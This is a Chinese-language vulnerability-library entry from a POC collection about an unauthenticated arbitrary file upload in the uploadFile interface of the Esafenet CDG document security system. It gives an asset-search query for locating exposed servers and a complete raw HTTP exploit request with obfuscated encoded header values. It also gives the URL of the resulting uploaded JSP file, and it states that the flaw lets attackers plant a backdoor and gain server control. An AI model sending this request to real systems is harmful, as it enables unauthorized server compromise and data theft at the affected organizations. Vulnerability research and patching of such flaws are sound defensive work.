---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 亿赛通电子文档安全管理系统uploadFile任意文件上传漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统uploadFile接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


# 四、漏洞复现
该漏洞是在在该域名8021端口下进行上传，上传的内容是在8443端口或者8090端口

上传文件

```plain
POST /file/uploadFile HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content: MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCMJIGHMNBBEBIAIKCHLENKGCPMEIIGODKKOEJJFEEIPNGHGBOOEIKNIOHIMCDONLKCEIFHIGKLHEGJNHMDAMIIELDOPGDKPOKKAHHDIMOJCJNHKMFABAFLFFDGEAJPIEOGPBNDHEOLDFBOFPFKBCEABHOPFDECBHBCFCEGO
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 144
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="file"
Content-Type: image/jpg

123
--00content0boundary00--
```


```plain
CBDJCOKKKDJALCHGLOICCHCGLHNPDANBDGPPNLNLHMHLAAAGALIIHCBFPKNFHKOFEIOKAOMHAMHLILNEHEPEMGFFHOPCEPFAHHGPLHEJOKNNMLCMCCFDJNKECLEGOLOMMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGEJMJMMGCAKMOOBKBNECCMOMJMEDMPDAJBMNKIJFPFOPEFNDABHJCLAINBDMEEODMBGKLIHCLLONIIGNIEMCBNKAPNPFPLOHCGM
```


上传文件位置，在8443端口或者8090端口

```plain
https://ip:8443/CDGServer3/3g/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dhcm5vbe1lakywrb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
